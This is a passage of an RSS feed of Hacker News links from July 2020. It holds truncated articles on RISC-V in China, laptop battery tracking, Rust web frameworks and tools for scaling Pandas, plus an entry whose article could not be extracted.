for the benefit of the ecosystem. Many small startups in China, now showered with new investments, are doing the same -- using RISC-V to make special purpose chips that are effectively proprietary.</p><p><em>(This is not to generalize that all Chinese organizations are bad open source players; some are contributing a lot and have open source in their DNA. I’ve profiled many of the big tech firms and some startups from the lens in Part II of my “</em><a href="https://interconnected.blog/open-source-in-china-the-game/"><em>Open Source in China</em></a><em>” series.)</em></p><p><strong>If</strong> China hopes to evolve RISC-V into a more powerful, general-purpose building block to achieve semiconductor self-reliance, Chinese organizations, both individually and collectively, would have to shift from a zero-sum “takers” mentality to a positive-sum “stakeholders” mentality. What that means in reality is absorbing and practicing the open source way of doing things -- not just contributing code upstream and being more willing to share, but also behaviors like transparent governance, open discussions with other stakeholders and developers, and clear due process for decision-making, big and small. <strong>These are both technical and human complexities.</strong></p><p>With an existential struggle at hand, there’s reason to believe that Chinese companies may behave differently for the sake of achieving a national imperative and be less concerned about the tit-for-tat, zero-sum nature of market competition, which is quite cutthroat in China. And<strong> if done right</strong>, RISC-V could unleash massive technological innovation broadly and help China deal with its existential struggle specifically.</p><h2 id="foundries-smic-hsmc">Foundries: SMIC, HSMC</h2><p>Let’…</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/riscv-china-nightingales/">https://interconnected.blog/riscv-china-nightingales/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/riscv-china-nightingales/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740272</guid>
            <pubDate>Sun, 05 Jul 2020 17:22:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Laptop Battery Insights]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740187">thread link</a>) | @theocs
<br/>
July 5, 2020 | https://blog.cfelde.com/2020/07/laptop-battery-insights/ | <a href="https://web.archive.org/web/*/https://blog.cfelde.com/2020/07/laptop-battery-insights/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p>Back in 2016 I mentioned that I started <a href="https://blog.cfelde.com/2016/01/tracking-my-laptop-battery/">tracking my laptop battery statistics</a> on my then new MBP. Well, now that laptop has reached EOL, with its batteries getting swollen and the fan often running a bit fast, probably due to all the dust inside it.</p>
<p>While I didn’t have any complaints about the overall performance of my trusty old laptop, after 5-6 years of everyday use, I felt it was time to upgrade. And it didn’t feel safe with the batteries swelling either! I might look into refurbishing it, if the cost of new batteries aren’t too ridiculous.</p>
<p>Anyway, as I mentioned in my previous battery blog post, I started logging battery statistics once every half hours, on a simple cron job, with a simple little script.</p>
<figure><img src="https://blog.cfelde.com/wp-content/uploads/2016/01/script-1024x361.png" alt="" srcset="https://blog.cfelde.com/wp-content/uploads/2016/01/script-1024x361.png 1024w, https://blog.cfelde.com/wp-content/uploads/2016/01/script-300x106.png 300w, https://blog.cfelde.com/wp-content/uploads/2016/01/script-768x270.png 768w, https://blog.cfelde.com/wp-content/uploads/2016/01/script-660x232.png 660w, https://blog.cfelde.com/wp-content/uploads/2016/01/script.png 1204w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
<p>So let’s take a look at 5-6 years of data, starting with battery capacity:</p>
<figure><img src="https://blog.cfelde.com/wp-content/uploads/2020/07/Battery-max-capacity-vs-Date.png" alt="" srcset="https://blog.cfelde.com/wp-content/uploads/2020/07/Battery-max-capacity-vs-Date.png 600w, https://blog.cfelde.com/wp-content/uploads/2020/07/Battery-max-capacity-vs-Date-300x186.png 300w" sizes="(max-width: 600px) 100vw, 600px"></figure>
<p>Got to say that I’m impressed with the overall trend here. I was expecting it to have a stronger downwards trend, considering age and usage, but also compared to the number of hours of use I got when running on batteries. I guess maybe I incorrectly remember how long I initially could run it on batteries when it was new.</p>
<p>What about cycle count then?</p>
<figure><img src="https://blog.cfelde.com/wp-content/uploads/2020/07/Usage-hours-acc-vs-Date.png" alt="" srcset="https://blog.cfelde.com/wp-content/uploads/2020/07/Usage-hours-acc-vs-Date.png 600w, https://blog.cfelde.com/wp-content/uploads/2020/07/Usage-hours-acc-vs-Date-300x186.png 300w" sizes="(max-width: 600px) 100vw, 600px"></figure>
<p>Here we see the battery cycle count in red, using the y-axis on the right, together with the accumulated hours of use. As expected these follow each other.</p>
<p>I’ve seen some state that Apple expects a battery to retain 80% of it’s capacity at 1000 cycles. I’m not close to 1000 cycles, but compared to the slow downwards trend on the capacity chart, that’s maybe not unreasonable. However, with the swelling going on, I wouldn’t be comfortable trying to get to 1000 cycles.</p>
<p>I’ve <a href="https://docs.google.com/spreadsheets/d/1HA-T8m78_6uhR_hYgmkW-WktgLQ1JX6ufjH3s_bri-Y/edit?usp=sharing">published all the charts and raw data on Google Sheets</a>, so feel free to look around. The only other chart I considered including was one showing average and median use by day. But, as it turns out, these were rather equal, with a little peak on Tuesdays. These aren’t maybe that insightful anyway, as I often just leave my laptop running.</p>
</div>
</div></div>]]>
            </description>
            <link>https://blog.cfelde.com/2020/07/laptop-battery-insights/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740187</guid>
            <pubDate>Sun, 05 Jul 2020 17:10:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Choosing a Rust web framework]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 30 (<a href="https://news.ycombinator.com/item?id=23740028">thread link</a>) | @LukeMathWalker
<br/>
July 5, 2020 | https://www.lpalmieri.com/posts/2020-07-04-choosing-a-rust-web-framework-2020-edition/ | <a href="https://web.archive.org/web/*/https://www.lpalmieri.com/posts/2020-07-04-choosing-a-rust-web-framework-2020-edition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

<blockquote>
<p><em>This post was originally meant as a section of <a href="https://www.lpalmieri.com/posts/2020-05-24-zero-to-production-0-foreword/"><strong>Zero To Production</strong></a> to explain the reasoning behind our technology choice. It eventually grew so large to be its own article!</em></p>

<p><em>You can discuss the article on <a href="https://news.ycombinator.com/item?id=23740028">HackerNews</a> or <a href="https://www.reddit.com/r/rust/comments/hlpsw5/choosing_a_rust_web_framework_2020_edition/">r/rust</a></em>.</p>
</blockquote>

<p>As of July 2020, the main web frameworks in the Rust ecosystem are:</p>

<ul>
<li><a href="https://actix.rs/"><code>actix-web</code></a>;<br></li>
<li><a href="https://rocket.rs/"><code>rocket</code></a>;<br></li>
<li><a href="https://github.com/http-rs/tide"><code>tide</code></a>;<br></li>
<li><a href="https://github.com/seanmonstar/warp"><code>warp</code></a>.</li>
</ul>

<p>Which one should you pick if you are about to start building a new <strong>production-ready</strong> API in Rust?</p>

<p>I will break down where each of those web frameworks stands when it comes to:</p>

<ul>
<li><a href="#1-comprehensiveness">Comprehensiveness</a>;<br></li>
<li><a href="#2-community-and-adoption">Community and adoption</a>;<br></li>
<li><a href="#3-sync-vs-async">Sync vs Async</a>, as well as their choice of <a href="#3-1-futures-runtime">futures runtime</a>;<br></li>
<li><a href="#4-documentation-tutorials-and-examples">Documentation, tutorials and examples</a>;<br></li>
<li><a href="#5-api-and-ergonomics">API and ergonomics</a>.</li>
</ul>

<p>I will in the end make <a href="#6-our-choice">my recommendation</a>.<br>
Worth remarking that there are no absolutes: different circumstances (and taste) might lead you to a different pick.</p>

<h2 id="1-comprehensiveness">1. Comprehensiveness</h2>

<p><code>actix-web</code>, <code>tide</code> and <code>warp</code> are <em>slim</em> web frameworks: they offer you an HTTP web server, routing logic, middleware infrastructure and basic building blocks and abstractions to parse, manipulate and respond to HTTP requests.</p>

<p><code>rocket</code> takes a different approach - it aims to be batteries-included: the most common needs should be covered by functionality provided out-of-the-box by <code>rocket</code> itself, with hooks for you to extend <code>rocket</code> if your usecase needs it.<br>
It should not come as a surprise then that <code>rocket</code> ships an easy-to-use <a href="https://rocket.rs/v0.4/guide/state/#databases">integration to manage connection pools</a> for several popular database (e.g. Postgres, Redis, Memcache, etc.) as well as its own <a href="https://rocket.rs/v0.4/guide/configuration/">configuration system</a> in <a href="https://api.rocket.rs/v0.4/rocket_contrib/"><code>rocket-contrib</code></a>, an ancillary crate hosted in <code>rocket</code>’s own repository.</p>

<p>We can compare them to frameworks available in other ecosystems:</p>

<ul>
<li><code>actix-web</code>, <code>tide</code> and <code>warp</code> are closer in spirit to <a href="https://palletsprojects.com/p/flask/"><code>Flask</code></a> from Python or <a href="https://expressjs.com/"><code>Express</code></a> from Javascript - they might be opinionated, but they do not ship a configuration management system or an ORM integration out of the box. You are in charge of structuring your API as you deem appropriate, bringing all the necessary crates and patterns into the picture;<br></li>
<li><code>rocket</code> is closer to <a href="https://www.djangoproject.com/"><code>Django</code></a> from Python or <a href="https://symfony.com/"><code>Symphony</code></a> from PHP: a stable and solid core with a set of high-quality in-tree components to fulfill your every day needs when building a solid web application. <code>rocket</code> has still a long way to go to match its peers in breadth and scope, but it is definitely off to a good start.</li>
</ul>

<p>Of course this is a snapshot of the landscape as of today, but the situation is continuously shifting according to the maintainers’ intentions - e.g. <code>actix-web</code> has slowly been accumulating more and more supporting functionality (from security to session management) in <a href="https://github.com/actix/actix-extras"><code>actix-extras</code></a>, under the umbrella of the <code>actix</code> GitHub organization.<br>
Furthermore, using a slim web framework does not force you to write everything from scratch as soon as the framework is falling short of your needs: you can leverage the ecosystem built by the community around it to avoid re-inventing the wheel on every single project.</p>

<h2 id="2-community-and-adoption">2. Community and adoption</h2>

<p>Numbers can be misleading, but they are a good conversation starting point. Looking at <a href="https://crates.io/">crates.io</a>, we have:</p>

<table>
<thead>
<tr>
<th>Framework</th>
<th>Total Downloads</th>
<th>Daily Downloads</th>
</tr>
</thead>

<tbody>
<tr>
<td><code>actix-web</code></td>
<td>~1250k</td>
<td>~3000</td>
</tr>

<tr>
<td><code>rocket</code></td>
<td>~525k</td>
<td>~1000</td>
</tr>

<tr>
<td><code>warp</code></td>
<td>~435k</td>
<td>~3000</td>
</tr>

<tr>
<td><code>tide</code></td>
<td>~47k</td>
<td>~300</td>
</tr>
</tbody>
</table>

<p>The number of total downloads is obviously influenced by how long a framework has been around (e.g. <code>actix-web:0.1.0</code> came out at the end of 2017!) while daily downloads are a good gauge for the current level of interest around it.</p>

<p>You should care about adoption and community size for a couple of reasons:</p>

<ul>
<li>consistent production usage over years makes it way less likely that you are going to be the first one to spot a major defect. Others cried so that you could smile (most of the time);<br></li>
<li>it correlates with the number of supporting crates for that framework;<br></li>
<li>it correlates with the amount of tutorials, articles and helping hands you are likely to find if you are struggling.</li>
</ul>

<p>The second point is particularly important for slim frameworks.<br>
You can get a feel of the impact of community size, once again, by looking at the number of results popping up on <a href="https://crates.io/">crates.io</a> when searching a framework name:</p>

<table>
<thead>
<tr>
<th>Framework</th>
<th># results</th>
</tr>
</thead>

<tbody>
<tr>
<td><code>rocket</code></td>
<td>178</td>
</tr>

<tr>
<td><code>actix-web</code></td>
<td>113</td>
</tr>

<tr>
<td><code>warp</code></td>
<td>57</td>
</tr>

<tr>
<td><code>tide</code></td>
<td>20</td>
</tr>
</tbody>
</table>

<p>Will all those crates be relevant? Unlikely.<br>
Will a fair share of them be outdated or unproven? Definitely.</p>

<p>Nonetheless it is a good idea, before starting a project, to have a quick look for functionality you know for a fact you will need. Let’s make a couple of quick examples with features we will be relying on in the email newsletter implementation we are building in <em>Zero To Production</em>:</p>

<ul>
<li>if you need to add Prometheus’ metrics to your API you can get off the ground in a couple of minutes with <a href="https://crates.io/crates/actix-web-prom"><code>actix-web-prom</code></a> or <a href="https://crates.io/crates/rocket_prometheus"><code>rocket-prometheus</code></a>, both with thousands of downloads. If you are using <code>warp</code> or <code>tide</code> you will have to write the integration from scratch;<br></li>
<li>if you want to add distributed tracing, <a href="https://crates.io/crates/actix-web-opentelemetry"><code>actix-web-opentelemetry</code></a> has your back. You will have to re-implement it if you choose any other framework.</li>
</ul>

<p>Most of these features are not too much work to implement, but the effort (especially maintenance) compounds over time. You need to choose your framework with your eyes wide open on the level of commitment it is going to require.</p>

<h2 id="3-sync-vs-async">3. Sync vs Async</h2>

<p>Rust landed its <code>async</code>/<code>await</code> syntax in version <code>1.39</code> - a game changer in terms of ergonomics for asynchronous programming.<br>
It took some time for the whole Rust ecosystem to catch up and adopt it, but it’s fair to say that crates dealing with IO-bound workloads are now generally expected to be async-first (e.g. <code>reqwest</code>).</p>

<p>What about web frameworks?<br>
<code>actix-web</code> adopted <code>async</code>/<code>await</code> with its <code>0.2.x</code> release, same as <code>warp</code>, while <code>tide</code> was using <code>async</code>/<code>await</code> before its stabilisation relying on the <code>nightly</code> Rust compiler.<br>
<code>rocket</code>, instead, still exposes a synchronous interface. <code>async</code>/<code>await</code> support is expected as part of its next <code>0.5</code> release, <a href="https://github.com/SergioBenitez/Rocket/issues/1065">in the making since last summer</a>.</p>

<p>Should you rule out <code>rocket</code> as a viable option because it does not yet support asynchronous programming?<br>
It depends.<br>
If you are implementing an application to handle high volumes of traffic with strict performance requirements it might be better to opt for an async web framework.<br>
If that is not the case, the lack of async support in <code>rocket</code> should not be one of your primary concerns.</p>

<h3 id="3-1-futures-runtime">3.1. Futures runtime</h3>

<p><code>async</code>/<code>await</code> is not all sunshine and roses.<br>
Asynchronous programming in Rust is built on top of the <code>Future</code> trait: a future exposes a <code>poll</code> method which has to be called to allow the future to make progress. You can think of Rust’s futures as <em>lazy</em>: unless polled, there is no guarantee that they will execute to completion.<br>
This is often been described as a <em>pull</em> model compared to the <em>push</em> model adopted by other languages<sup id="fnref:async-announcement"><a href="#fn:async-announcement">1</a></sup>, which has some interesting implications when it comes to performance and task cancellation.</p>

<p>Wait a moment though - if futures are lazy and Rust does not ship a runtime in its standard library, who is in charge to call the <code>poll</code> method?<br>
<strong>BYOR</strong> - <strong>B</strong>ring <strong>Y</strong>our <strong>O</strong>wn <strong>R</strong>untime!<br>
The async runtime is literally a dependency of your project, brought in as a crate.<br>
This provides you with a great deal of flexibility: you could indeed implement your own runtime optimised to cater for the specific requirements of your usecase (see <a href="http://smallcultfollowing.com/babysteps/blog/2019/12/09/async-interview-2-cramertj/#async-interview-2-cramertj">the Fuchsia project</a> or <a href="https://github.com/bastion-rs/bastion"><code>bastion</code></a>’s actor framework) or simply choose the most suitable on a case-by-case basis according to the needs of your application.<br>
That sounds amazing on paper, but reality is a bit less glamorous: interoperability between runtimes is quite poor at the moment; mixing runtimes can be painful, often causing issues that are not straight-forward either to triage, detect or solve.<br>
While most libraries should not depend on runtimes directly, relying instead on the interfaces exposed by the <a href="https://docs.rs/futures/0.3.5/futures/"><code>futures</code></a> crate, this is often not the case due to historical baggage (e.g. <code>tokio</code> was for a long time the only available runtime in the ecosystem), practical needs (e.g. a framework has to be able to spawn tasks) or lack of standardisation (e.g. the ongoing discussion on the <code>AsyncRead</code>/<code>AsyncWrite</code> traits - see <a href="http://smallcultfollowing.com/babysteps/blog/2020/01/20/async-interview-5-steven-fackler/">here</a> and <a href="http://smallcultfollowing.com/babysteps/blog/2020/03/10/async-interview-7-withoutboats/#async-interview-7-withoutboats">here</a>).<br>
Therefore picking an async web framework goes beyond the framework itself: you are choosing an ecosystem of crates, suddenly making it much more cumbersome to consume libraries relying on a different async runtime.</p>

<p>The current state of affairs is far from ideal, but if you are writing async Rust today I’d recommend you to make a <em>deliberate</em> choice when it comes to your async runtime.</p>

<p>The two main general-purpose async runtimes currently available in Rust are <a href="https://tokio.rs/"><code>tokio</code></a> and <a href="https://github.com/async-rs/async-std"><code>async-std</code></a>.<br>
<code>tokio</code> has been around for quite some time and it has seen extensive production usage. It is fairly tunable, although this results in a larger and more complex API surface.<br>
<code>async-std</code> was released almost a year ago, around the time of <code>async</code>/<code>await</code> stabilization. It provides great ergonomics, while leaving less room for configuration knobs.</p>

<p><a href="https://crates.io/">crates.io</a> can once again be used as a gauge for adoption and readiness:</p>

<table>
<thead>
<tr>
<th>Runtime</th>
<th>Total Downloads</th>
<th>Daily Downloads</th>
</tr>
</thead>

<tbody>
<tr>
<td><code>tokio</code></td>
<td>~9600k</td>
<td>~30k</td>
</tr>

<tr>
<td><code>async-std</code></td>
<td>~600k</td>
<td>~4k</td>
</tr>
</tbody>
</table>

<p>How do frameworks map to runtimes?</p>

<table>
<thead>
<tr>
<th>Framework</th>
<th>Runtime</th>
</tr>
</thead>

<tbody>
<tr>
<td><code>actix-web</code></td>
<td><code>tokio</code></td>
</tr>

<tr>
<td><code>rocket</code> (<code>0.5.x</code>)</td>
<td><code>tokio</code></td>
</tr>

<tr>
<td><code>tide</code></td>
<td><code>async-std</code></td>
</tr>

<tr>
<td><code>warp</code></td>
<td><code>tokio</code></td>
</tr>
</tbody>
</table>

<h2 id="4-documentation-tutorials-and-examples">4. Documentation, tutorials and examples</h2>

<p>Having to dive into the source code to understand how something works can be fun (and educational!), but it should be a choice, not a necessity.<br>
In most situations I’d rather rely on the framework being well-documented, including non-trivial examples of relevant usage patterns.<br>
Good documentation, tutorials and fully-featured examples are <strong>mission-critical</strong> if you are working as part of a team, especially if one or more teammates are not experienced Rust developers.</p>

<p>Rust’s tooling treats documentation as a first class concept (just run <code>cargo doc --open</code> to get auto-generated docs for your project!) and it grew to be part of the culture of the Rust community itself. Library authors generally take it seriously and web frameworks are no exception to the general tendency: what you can find on <a href="https://docs.rs/">docs.rs</a> is quite thorough, with contextual examples …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lpalmieri.com/posts/2020-07-04-choosing-a-rust-web-framework-2020-edition/">https://www.lpalmieri.com/posts/2020-07-04-choosing-a-rust-web-framework-2020-edition/</a></em></p>]]>
            </description>
            <link>https://www.lpalmieri.com/posts/2020-07-04-choosing-a-rust-web-framework-2020-edition/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740028</guid>
            <pubDate>Sun, 05 Jul 2020 16:49:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scaling Pandas: Comparing Dask, Ray, Modin, Vaex, and Rapids]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 30 (<a href="https://news.ycombinator.com/item?id=23740012">thread link</a>) | @FHMS
<br/>
July 5, 2020 | https://datarevenue.com/en-blog/pandas-vs-dask-vs-vaex-vs-modin-vs-rapids-vs-ray | <a href="https://web.archive.org/web/*/https://datarevenue.com/en-blog/pandas-vs-dask-vs-vaex-vs-modin-vs-rapids-vs-ray">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Python and its most popular data wrangling library, Pandas, are soaring in popularity. Compared to competitors like Java, Python and Pandas make data exploration and transformation <strong>simple</strong>.</p><p>But both Python and Pandas are known to have issues around <strong>scalability</strong> and <strong>efficiency</strong>.</p><p>Python loses some efficiency right off the bat because it’s an interpreted, dynamically typed language. But more importantly, Python has always focused on simplicity and readability over raw power. Similarly, Pandas focuses on offering a simple, high-level API, largely ignoring performance. In fact, the creator of Pandas wrote “<a href="https://wesmckinney.com/blog/apache-arrow-pandas-internals/">The 10 things I hate about pandas</a>,” which summarizes these issues:</p><figure id="w-node-412b9aecdea3-e2612716"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5ef62e9007b2509635bd1ba2_image3.png" alt="Ten things Wes McKinney hates about Pandas."></p><figcaption>Performance issues and lack of flexibility are the main things Pandas’ own creator doesn’t like about the library. (<a href="https://wesmckinney.com/blog/apache-arrow-pandas-internals/">source</a>)</figcaption></figure><p>So it’s no surprise that many developers are trying to add more power to Python and Pandas in various ways. Some of the most notable projects are:</p><ul role="list"><li><a href="https://www.datarevenue.com/ml-tools/dask"><strong>Dask</strong></a><strong>:</strong> a low-level scheduler and a high-level partial Pandas replacement, geared toward running code on compute clusters.</li><li><strong>Ray:</strong> a low-level framework for parallelizing Python code across processors or clusters.</li><li><a href="https://www.datarevenue.com/ml-tools/modin"><strong>Modin</strong></a><strong>:</strong> a drop-in replacement for Pandas, powered by either <strong>Dask</strong> or <strong>Ray</strong>.</li><li><a href="https://www.datarevenue.com/ml-tools/vaex"><strong>Vaex</strong></a><strong>:</strong> a partial Pandas replacement that uses lazy evaluation and memory mapping to allow developers to work with large datasets on standard machines.</li><li><a href="https://www.datarevenue.com/ml-tools/rapids"><strong>RAPIDS</strong></a><strong>: </strong>a collection of data-science libraries that run on GPUs and include <a href="https://github.com/rapidsai/cudf">cuDF</a>, a partial replacement for Pandas.</li></ul><p>There are others, too. Below is an overview of the Python data wrangling landscape:</p><figure id="w-node-78c43e6cecae-e2612716"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5ef62eb85c7038610cea20d0_image2.png" alt="A graph showing how often popular data wrangling libraries are compared in Google searches."></p><figcaption>Dask, Modin, Vaex, Ray, and CuDF are often considered potential alternatives to each other. Source: Created with <a href="https://anvaka.github.io/vs/?query=Dask">this tool</a></figcaption></figure><p>So if you’re working with a lot of data and need faster results, which should you use?</p><h2><strong>Just tell me which one to try</strong></h2><p>Before you can make a decision about which tool to use, it’s good to have some more context about each of their approaches. We’ll compare each of them closely, but you’ll probably want to try them out in the following order:</p><ul role="list"><li><strong>Modin</strong>, with <strong>Ray</strong> as a backend. By installing these, you might see significant benefit by changing just a single line (`import pandas as pd` to `import modin.pandas as pd`). Unlike the other tools, Modin aims to reach full compatibility with Pandas.</li><li><strong>Dask</strong>,<strong> </strong>a larger and hence more complicated project. But Dask also provides <a href="https://docs.dask.org/en/latest/dataframe.html">Dask.dataframe</a>, a higher-level, Pandas-like library that can help you deal with <a href="https://en.wikipedia.org/wiki/External_memory_algorithm">out-of-core</a> datasets.</li><li><strong>Vaex, </strong>which is designed to help you work with large data on a standard laptop. Its Pandas replacement covers some of the Pandas API, but it’s more focused on exploration and visualization.</li><li><strong>RAPIDS, </strong>if you have access to NVIDIA graphics cards<strong>.</strong></li></ul><h2><strong>Quick comparison</strong></h2><p>Each of the libraries we examine has different strengths, weaknesses, and scaling strategies. The following table gives a broad overview of these. Of course, as with many things, most of the scores below are heavily dependent on your exact situation.&nbsp;</p><figure id="w-node-3fc1cb6579be-e2612716"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5ef62ef85090a97b0c469fa9_image5.png" alt="A table comparing the tools across maturity, popularity, ease of adoption, and other metrics."></p><figcaption>Dask and Ray are more mature, but Modin and Vaex are easier to get started with. Rapids is useful if you have access to GPUs.</figcaption></figure><p>These are subjective grades, and they may vary widely given your specific circumstances. When assigning these grades, we considered:</p><ul role="list"><li><strong>Maturity: </strong>The time since the first commit and the number of commits.</li><li><strong>Popularity: </strong>The number of GitHub stars.</li><li><strong>Ease of Adoption: </strong>The amount of knowledge expected from users, presumed hardware resources, and ease of installation.</li><li><strong>Scaling ability: </strong>The broad dataset size limits for each tool, depending on whether it relies mainly on RAM, hard drive space on a single machine, or can scale up to clusters of machines.&nbsp;</li><li><strong>Use case: </strong>Whether the libraries are designed to speed up Python software in general (“<strong>General</strong>”), are focused on data science and machine learning (“<strong>Data science</strong>”), or are limited to simply replacing Pandas’ ‘DataFrame’ functionality (“<strong>DataFrame</strong>”).</li></ul><h2><strong>CPUs, GPUs, Clusters, or Algorithms?</strong></h2><p>If your dataset is too large to work with efficiently on a single machine, your main options are to run your code across…</p><ul role="list"><li><strong>...multiple threads or processors:</strong> Modern CPUs have several independent cores, and each core can run many threads. Ensuring that your program uses all the potential processing power by parallelizing across cores is often the easiest place to start.</li><li><strong>...GPU cores: </strong>Graphics cards were originally designed to efficiently carry out basic operations on millions of pixels in parallel. However, developers soon saw other uses for this power, and “GP-GPU” (general processing on a graphics processing unit) is now a popular way to speed up code that relies heavily on matrix manipulations.</li><li><strong>...compute clusters: </strong>Once you hit the limits of a single machine, you need a networked cluster of machines, working cooperatively.</li></ul><p>Apart from adding more hardware resources, clever algorithms can also improve efficiency. Tools like Vaex rely heavily on <a href="https://en.wikipedia.org/wiki/Lazy_evaluation"><strong>lazy evaluation</strong></a><strong> </strong>(not doing any computation until it’s certain the results are needed) and <a href="https://en.wikipedia.org/wiki/Memory-mapped_file"><strong>memory mapping</strong></a><strong> </strong>(treating files on hard drives as if they were loaded into RAM).</p><p>None of these strategies is inherently better than the others, and you should choose the one that suits your specific problem.</p><p>Parallel programming (no matter whether you’re using threads, CPU cores, GPUs, or clusters) offers many benefits, but it’s also quite complex, and it makes tasks such as debugging far more difficult.</p><p>Modern libraries can hide some – but not all – of this added complexity. No matter which tools you use, you’ll run the risk of expecting everything to work out neatly (below left), but getting chaos instead (below right).</p><figure id="w-node-7b8872b99c95-e2612716"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5efef852495a4ce0972910e9_image4_s.jpg" alt="Puppies in a row eating food from different bowls – and then chaos ensues."></p><figcaption>Parallel processing doesn’t always work out as neatly as you expect. (<a href="https://www.reddit.com/r/aww/comments/2oagj8/multithreaded_programming_theory_and_practice/">Source</a>)</figcaption></figure><h2><strong>Dask vs. Ray vs. Modin vs. Vaex vs. RAPIDS</strong></h2><p>While not all of these libraries are direct alternatives to each other, it’s useful to compare them each head-to-head when deciding which one(s) to use for a project.</p><p>Before getting into the details, note that:</p><ul role="list"><li>RAPIDS is a collection of libraries. For this comparison, we consider only the <strong>cuDF</strong> component, which is the RAPIDS equivalent of Pandas.</li><li>Dask is better thought of as two projects: a low-level Python scheduler (similar in some ways to Ray) and a higher-level Dataframe module (similar in many ways to Pandas).</li></ul><h3><strong>Dask vs. Ray</strong></h3><p>Dask (as a lower-level scheduler) and Ray overlap quite a bit in their goal of making it easier to execute Python code in parallel across clusters of machines. Dask focuses more on the data science world, providing higher-level APIs that in turn provide partial replacements for Pandas, NumPy, and scikit-learn, in addition to a low-level scheduling and cluster management framework.</p><p>The creators of Dask and Ray discuss how the libraries compare in <a href="https://github.com/ray-project/ray/issues/642">this GitHub thread</a>, and they conclude that the scheduling strategy is one of the key differentiators. Dask uses a centralized scheduler to share work across multiple cores, while Ray uses distributed bottom-up scheduling.</p><h3><strong>Dask vs. Modin</strong></h3><p>Dask (the higher-level Dataframe) acknowledges the limitations of the Pandas API, and while it partially emulates this for familiarity, it doesn’t aim for full Pandas compatibility. If you have complicated existing Pandas code, it’s unlikely that you can simply switch out Pandas for Dask.Dataframe and have everything work as expected. By contrast, this is exactly the goal Modin is working toward: 100% coverage of Pandas. Modin can run on top of Dask but was originally built to work with Ray, and that integration remains more mature.</p><h3><strong>Dask vs. Vaex</strong></h3><p>Dask (Dataframe) is not fully compatible with Pandas, but it’s pretty close. These close ties mean that Dask also carries some of the baggage inherent to Pandas. Vaex deviates more from Pandas (although for basic operations, like reading data and computing summary statistics, it’s very similar) and therefore is also less constrained by it.</p><p>Ultimately, Dask is more focused on letting you scale your code to compute clusters, while Vaex makes it easier to work with large datasets on a single machine. Vaex also provides features to help you easily visualize and plot large datasets, while Dask focuses more on data processing and wrangling.</p><h3><strong>Dask vs. RAPIDS (cuDF)</strong></h3><p>Dask and RAPIDS play nicely together via an integration <a href="https://rapids.ai/dask.html">provided by</a> RAPIDS. If you have a compute cluster, you should use Dask. If you have an NVIDIA graphics card, you should use RAPIDS. If you have a compute cluster of NVIDIA GPUs, you should use both.</p><h3><strong>Ray vs. Modin or Vaex or RAPIDS</strong></h3><p>It’s not that meaningful to compare Ray to Modin, Vaex, or RAPIDS. Unlike the other libraries, Ray doesn’t offer high-level APIs or a Pandas equivalent. Instead, Ray powers Modin and <a href="https://docs.ray.io/en/latest/tune.html">integrates with RAPIDS</a> in a similar way to Dask.</p><h3><strong>Modin vs. Vaex</strong></h3><p>As with the Dask and Vaex comparison, Modin’s goal is to provide a full Pandas replacement, while Vaex deviates more from Pandas. Modin should be your first port of call if you’re looking for a quick way to speed up existing Pandas code, while Vaex is more likely to be interesting for new projects or specific use cases (especially visualizing large datasets on a single machine).</p><h3><strong>Modin vs. RAPIDS (cuDF)</strong></h3><p>Modin scales Pandas code by using many CPU cores, via Ray or Dask. RAPIDS scales Pandas code by running it on GPUs. If you have GPUs available, give RAPIDS a try. But the easiest win is likely to come from Modin, and you should probably turn to RAPIDS only after you’ve tried Modin first.</p><h3><strong>Vaex vs. RAPIDS (cuDF)</strong></h3><p>Vaex and RAPIDS are similar in that they can both provide performance boosts on a single machine: Vaex by better utilizing your computer’s hard drive and processor cores, and RAPIDS by using your computer’s GPU (if it’s available and compatible). The RAPIDS project as a whole aims to be much broader than Vaex, letting you do machine learning end-to-end without the data leaving your GPU. Vaex is better for prototyping and data exploration, letting you explore large datasets on consumer-grade machines.</p><h2><strong>Final remarks: Premature optimization is the root of all evil</strong></h2><p>It’s fun to play with new, specialized tools. That said, many …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://datarevenue.com/en-blog/pandas-vs-dask-vs-vaex-vs-modin-vs-rapids-vs-ray">https://datarevenue.com/en-blog/pandas-vs-dask-vs-vaex-vs-modin-vs-rapids-vs-ray</a></em></p>]]>
            </description>
            <link>https://datarevenue.com/en-blog/pandas-vs-dask-vs-vaex-vs-modin-vs-rapids-vs-ray</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740012</guid>
            <pubDate>Sun, 05 Jul 2020 16:47:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3DChan V2, a 3D Imageboard]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23739898">thread link</a>) | @alexkrunch
<br/>
July 5, 2020 | https://3dchan.net/v3/ | <a href="https://web.archive.org/web/*/https://3dchan.net/v3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://3dchan.net/v3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739898</guid>
            <pubDate>Sun, 05 Jul 2020 16:33:57 GMT</pubDate>
        </item>
        <item>
            <title>
